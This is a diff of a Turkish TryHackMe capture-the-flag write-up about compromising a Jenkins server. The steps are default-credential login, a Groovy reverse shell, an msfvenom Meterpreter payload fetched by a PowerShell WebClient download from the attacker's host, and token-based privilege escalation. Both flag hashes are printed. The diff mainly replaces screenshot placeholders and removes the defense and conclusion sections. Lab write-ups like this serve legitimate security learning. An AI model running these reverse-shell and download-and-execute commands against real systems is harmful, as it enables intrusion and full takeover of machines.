@@ -7,8 +7,7 @@
 ```bash
 nmap -sS -A -p- -Pn 10.113.165.224
 ```
-
-📸 **[EKRAN GÖRÜNTÜSÜ 1 — Nmap tarama sonucu (tam terminal çıktısı)]**
+<img width="1516" height="689" alt="nmap" src="https://github.com/user-attachments/assets/9b09f4ff-6482-497b-83af-27a83555b39d" />
 
 **Tespit edilen açık portlar:**
 
@@ -31,21 +30,16 @@ Nmap çıktısında dikkatimi çeken birkaç önemli detay oldu:
 
 ### 2.1 Port 80 — IIS
 
+<img width="1919" height="564" alt="İlk site" src="https://github.com/user-attachments/assets/0f2544ad-1dfd-452d-85f2-1e820515dfad" />
+
 Port 80 üzerinde çalışan siteye yönelik `ffuf` ile dizin/dosya taraması gerçekleştirdim:
-
-```bash
-ffuf -u http://10.113.165.224/FUZZ -w <wordlist> -mc 200,301,302
-```
-
-📸 **[EKRAN GÖRÜNTÜSÜ 2 — ffuf tarama sonucu]**
-
 Bu taramadan anlamlı bir sonuç elde edemedim, dolayısıyla odak noktamı **port 8080**'e kaydırdım.
 
 ### 2.2 Port 8080 — Jenkins Login Paneli
 
 Tarayıcı üzerinden `http://10.113.165.224:8080` adresine gittiğimde bir **login paneli** ile karşılaştım. `robots.txt`'deki disallow kaydı ve arayüz tasarımı bunun bir yönetim paneli olduğunu doğruluyordu.
 
-📸 **[EKRAN GÖRÜNTÜSÜ 3 — Port 8080'deki login paneli görünümü]**
+<img width="1919" height="874" alt="jenkins site" src="https://github.com/user-attachments/assets/bd2eb5e1-684a-478a-b4d3-f765e8a64ab5" />
 
 Elimde herhangi bir kimlik bilgisi olmadığından, ilk denemem **varsayılan (default) credential** kombinasyonları oldu. TryHackMe görev sorusu da bunu doğrular nitelikteydi:
 
@@ -60,23 +54,17 @@ Kullanıcı adı : admin
 
 ile panele başarıyla giriş yaptım.
 
-📸 **[EKRAN GÖRÜNTÜSÜ 4 — admin:admin ile başarılı giriş]**
-
-> ⚠️ **Öğrenilen ders:** Yönetim panellerinde varsayılan kimlik bilgilerinin denenmesi, özellikle internal/test ortamlarında hâlâ etkili bir ilk erişim vektörüdür.
-
----
+<img width="1919" height="649" alt="login" src="https://github.com/user-attachments/assets/8af3a0ca-d65e-46d0-bc04-52a8669606e1" />
 
 ## 3. Jenkins Üzerinden Uzaktan Kod Çalıştırma
 
 Giriş yaptıktan sonra karşıma bir **Jenkins** paneli çıktı. Jenkins, CI/CD süreçlerinde yaygın kullanılan bir otomasyon aracıdır ve doğru yapılandırılmadığında ciddi bir saldırı yüzeyi sunar.
 
-📸 **[EKRAN GÖRÜNTÜSÜ 5 — Jenkins ana panel görünümü]**
-
 **Manage Jenkins → Script Console** yolunu takip ettiğimde, sunucu üzerinde doğrudan **Groovy script** çalıştırabileceğim bir alan buldum:
 
 > *"Type in an arbitrary Groovy script and execute it on the server"*
 
-📸 **[EKRAN GÖRÜNTÜSÜ 6 — Script Console arayüzü]**
+<img width="1919" height="654" alt="script console" src="https://github.com/user-attachments/assets/68038b77-18e9-4d7e-9311-1236bcafafb5" />
 
 Bu, Jenkins'te bilinen ve çok kritik bir uzaktan kod çalıştırma vektörüdür. Groovy reverse shell payload'ları için araştırma yaptığımda [frohoff'un gist sayfasına](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ulaştım ve payload'ı kendi IP/port bilgilerime göre düzenledim:
 
@@ -105,14 +93,9 @@ Payload'ı çalıştırmadan önce, kendi makinemde bağlantıyı karşılamak i
 ```bash
 nc -lvnp 8044
 ```
+Script'i **Execute** butonuna basarak çalıştırdım ve listener tarafında bağlantının düştüğünü gördüm
 
-📸 **[EKRAN GÖRÜNTÜSÜ 7 — Netcat listener başlatma]**
-
-Script'i **Execute** butonuna basarak çalıştırdım ve listener tarafında bağlantının düştüğünü gördüm:
-
-📸 **[EKRAN GÖRÜNTÜSÜ 8 — Reverse shell bağlantısının alınması]**
-
-Bu noktada hedef sistem üzerinde bir **cmd.exe** shell'ine sahip oldum.
+<img width="554" height="105" alt="shell1" src="https://github.com/user-attachments/assets/9754e8b7-9926-4264-9f50-e9e16d11bc7f" />
 
 ---
 
@@ -123,15 +106,11 @@ Shell'i aldıktan sonra ilk hedefim `user.txt` flag'ini bulmaktı. `bruce` kulla
 ```powershell
 C:\Users\bruce\Desktop>type user.txt
 ```
-
-📸 **[EKRAN GÖRÜNTÜSÜ 9 — user.txt içeriğinin görüntülenmesi]**
+<img width="309" height="55" alt="flag1" src="https://github.com/user-attachments/assets/00a45a8a-bb06-4972-939e-ae3444f890fd" />
 
 ```
 79007a09481963edf2e1321abd9ae2a0
 ```
-
-✅ **User flag başarıyla elde edildi.**
-
 ---
 
 ## 5. Yetki Yükseltme
@@ -143,8 +122,7 @@ Sistemde hangi haklara sahip olduğumu görmek için `whoami /priv` komutunu ça
 ```powershell
 C:\Program Files (x86)\Jenkins>whoami /priv
 ```
-
-📸 **[EKRAN GÖRÜNTÜSÜ 10 — whoami /priv çıktısı]**
+<img width="687" height="516" alt="whoamipriv" src="https://github.com/user-attachments/assets/a5606ce6-f69d-4ddd-8eb3-aced43bdcbc2" />
 
 Çıktıda dikkatimi çeken en önemli iki privilege şunlardı:
 
@@ -173,7 +151,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 \
   -f exe -o shell-name.exe
 ```
 
-📸 **[EKRAN GÖRÜNTÜSÜ 11 — msfvenom payload üretim çıktısı]**
+<img width="1271" height="205" alt="beacon" src="https://github.com/user-attachments/assets/1d8e0618-b5ae-4260-a7a7-1c1372af4043" />
 
 **Çıktı özeti:**
 
@@ -188,14 +166,14 @@ Payload dosyasını hedefe ulaştırmak için kendi dizinimde basit bir HTTP sun
 ```bash
 python3 -m http.server 8000
 ```
+<img width="693" height="124" alt="pythonserver" src="https://github.com/user-attachments/assets/5af23249-e47a-4aa4-8989-07a9fa9c1e75" />
 
 Hedef makine üzerinden PowerShell ile dosyayı indirdim:
 
 ```powershell
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://192.168.134.19:8000/shell-name.exe','shell-name.exe')"
 ```
-
-📸 **[EKRAN GÖRÜNTÜSÜ 12 — Payload'ın hedefe indirilmesi ve python http.server logu]**
+<img width="1158" height="678" alt="shellalma" src="https://github.com/user-attachments/assets/1d5f90b9-ecb6-4a12-967c-cf95749c6ab9" />
 
 ### 5.3 Metasploit Handler ve Shell'in Tetiklenmesi
 
@@ -209,7 +187,7 @@ set LPORT <listening-port>
 run
 ```
 
-📸 **[EKRAN GÖRÜNTÜSÜ 13 — Metasploit handler ayarları]**
+<img width="910" height="600" alt="msfconsole ayarlar" src="https://github.com/user-attachments/assets/40a5c9d0-a68f-4bd4-b8d7-b302b0f79b29" />
 
 Ardından hedef sistemde payload'ı çalıştırdım:
 
@@ -219,7 +197,10 @@ Start-Process "shell-name.exe"
 
 Bu işlemle birlikte Metasploit handler tarafında bir Meterpreter oturumu açıldı:
 
-📸 **[EKRAN GÖRÜNTÜSÜ 14 — Meterpreter session açılışı]**
+<img width="1158" height="678" alt="shellalma" src="https://github.com/user-attachments/assets/a8a57775-7b18-48c6-b946-d0c9b5a76e58" />
+
+<img width="907" height="173" alt="shell2" src="https://github.com/user-attachments/assets/8e80945e-b7a1-4783-9958-43f33e634953" />
+
 
 ```
 meterpreter > getsystem
@@ -228,8 +209,6 @@ meterpreter > getsystem
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
-
-📸 **[EKRAN GÖRÜNTÜSÜ 15 — getsystem ve getuid çıktıları]**
 
 ### 5.4 Process Migration ile Token Sorununun Çözülmesi
 
@@ -243,7 +222,8 @@ Bu nedenle, doğru izinlere sahip başka bir process'e **migrate** olmam gerekiy
 meterpreter > ps
 ```
 
-📸 **[EKRAN GÖRÜNTÜSÜ 16 — ps komutu ile process listesi]**
+<img width="1142" height="365" alt="migrate1" src="https://github.com/user-attachments/assets/1f41244d-b1b7-468e-be22-9a167be2422c" />
+
 
 `services.exe` process'ini buldum:
 
@@ -259,7 +239,8 @@ meterpreter > migrate 668
 [*] Migration completed successfully.
 ```
 
-📸 **[EKRAN GÖRÜNTÜSÜ 17 — migrate komutu başarılı çıktısı]**
+<img width="368" height="49" alt="migrate2" src="https://github.com/user-attachments/assets/ab6f4e28-6b08-4ac6-aea9-5945b171199c" />
+
 
 ---
 
@@ -271,43 +252,9 @@ meterpreter > migrate 668
 meterpreter > cat C:/Windows/System32/config/root.txt
 ```
 
-📸 **[EKRAN GÖRÜNTÜSÜ 18 — root.txt flag'inin görüntülenmesi]**
+<img width="451" height="31" alt="flag2" src="https://github.com/user-attachments/assets/ef75939a-00a5-465c-bb5f-af0afc48d319" />
+
 
 ```
 dff0f748678f280250f25a45b8046b4a
 ```
-
-✅ **Root flag başarıyla elde edildi. Makine tamamlandı.**
-
----
-
-## 7. Sonuç ve Öğrenilenler
-
-Bu makine, gerçek dünyada sıkça karşılaşılabilecek birkaç kritik güvenlik zafiyetini bir arada işliyor:
-
-- **Varsayılan kimlik bilgileri**: Jenkins panelinde `admin:admin` gibi zayıf/varsayılan credential'ların kullanılması, ilk erişim için yeterli oldu.
-- **Jenkins Script Console RCE**: Script Console gibi güçlü yönetim özellikleri, doğru şekilde kısıtlanmadığında doğrudan uzaktan kod çalıştırma imkanı sağlıyor.
-- **Token vs. Primary Token farkı**: `getsystem` ile yüksek yetkili bir token elde etmenin, o yetkilerle process çalıştırabilmekle aynı şey olmadığını; bunun için doğru process'e **migrate** olmak gerektiğini pratik olarak deneyimledim.
-- **SeImpersonatePrivilege / SeDebugPrivilege**: Bu privilege'ların aktif olması, yetki yükseltme saldırıları için önemli bir sinyal.
-
-### 🛡️ Savunma Önerileri
-
-- Jenkins gibi yönetim panellerinde **güçlü, benzersiz kimlik bilgileri** kullanılmalı ve varsayılan hesaplar devre dışı bırakılmalı.
-- **Script Console** gibi kritik özellikler, yalnızca gerçekten ihtiyaç duyan ve yetkilendirilmiş kullanıcılara açılmalı; mümkünse Matrix-based security ile erişim kısıtlanmalı.
-- Servisler internete açık tutulmamalı; gerekiyorsa VPN veya IP whitelist arkasına alınmalı.
-- Sistem üzerinde çalışan servis hesaplarının gereğinden fazla privilege'a sahip olmaması sağlanmalı.
-
----
-
-## 📎 Kullanılan Araçlar
-
-- `nmap`
-- `ffuf`
-- Jenkins Script Console (Groovy)
-- `netcat`
-- `msfvenom`
-- Metasploit Framework (`multi/handler`, Meterpreter)
-
----
-
-*Bu writeup öğrenme amaçlı hazırlanmıştır ve yalnızca yetkilendirilmiş TryHackMe ortamında gerçekleştirilen bir çözümü belgelemektedir.*
